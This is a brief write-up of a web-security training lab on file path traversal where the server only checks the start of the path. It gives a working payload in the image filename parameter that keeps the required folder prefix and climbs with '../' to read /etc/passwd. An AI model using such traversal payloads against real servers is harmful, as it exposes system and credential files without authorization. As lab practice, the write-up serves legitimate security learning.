# Lab Writeup: File path traversal, validation of start of path

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

1. Open in new tab one of the images e.g: `https://0a80000c03ffe99d885933f7004500eb.web-security-academy.net/image?filename=6.jpg`
2. Change the filename param to become `/var/www/images/../../../etc/passwd` using burp repeater. Note that you have to include the required path (bc the program validates it) which is `/var/www/images`. Here's the full path `/image?filename=/var/www/images/../../../etc/passwd`
3. Send the request, get all the file's contents and the challenge is solved

   ![Start Path Traversal](/assets/start-path-traversal.png)
